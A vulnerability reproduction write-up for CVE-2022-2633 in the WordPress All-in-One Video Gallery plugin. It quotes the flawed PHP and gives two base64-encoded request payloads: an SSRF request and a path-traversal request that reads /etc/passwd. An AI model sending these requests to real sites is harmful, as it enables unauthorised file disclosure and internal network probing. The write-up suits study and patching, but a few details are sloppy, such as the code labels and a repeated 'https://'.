# WordPress All-in-One Video Gallery video.php Arbitrary file reading vulnerability CVE-2022-2633

## Vulnerability Description

WordPress All-in-One Video Plugin Gallery video.php file has SSRF and arbitrary file reading vulnerability. The attacker reads any file by sending a specific request package.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">WordPress All-in-One Video Gallery  <= 2.6.0</span>

## Plugin Name

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">All-in-One Video Gallery</span>

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">https://downloads.wordpress.org/plugin/all-in-one-video-gallery.2.6.0.zip</span>

## Vulnerability reappears

Compare the files that are fixed to find the files with vulnerabilities wp-content/plugins/all-in-one-video-gallery/public/video.php

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1665396901441-051cdcb4-9932-48f7-96f7-b57aa55b37b0.png)

Here, the dl parameter is received. When the dl parameter is not a numeric type, the parameter will be decoded and passed to base64.

```sql
		if ( is_numeric( $_GET['dl'] ) ) {
			$file = get_post_meta( (int) $_GET['dl'], 'mp4', true );
		} else {
			$file = base64_decode( $_GET['dl'] );
		}

		if ( empty( $file ) ) {
			die( esc_html__( 'Download file URL is empty.', 'all-in-one-video-gallery' ) );
           	exit;
        }
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1665398476539-d7b73586-47fb-49ac-aefc-75518d40abf3.png)

When https:// or https:// does not exist in the passed parameter, the value of the parameter $formatted_path changes

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1665400025228-ec8b2210-1683-4f95-b05d-085338323586.png)

When $formatted_path is url, an echo can be obtained by passing in the target URL encoded by base64.

```sql
/index.php/video/?dl=aHR0cHM6Ly93d3cuYmFpZHUuY29t
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1665400131718-e35e3a69-9fef-4717-b22c-25e07f659dac.png)

Looking at the last fragment of the code, there is a vulnerability to read any file

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1665400190046-5f6608e0-f8d6-4291-ba23-9d468a95ac46.png)

```sql
/index.php/video/?dl=Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1665400254761-b7c390f4-6412-4104-a806-856aabf21e98.png)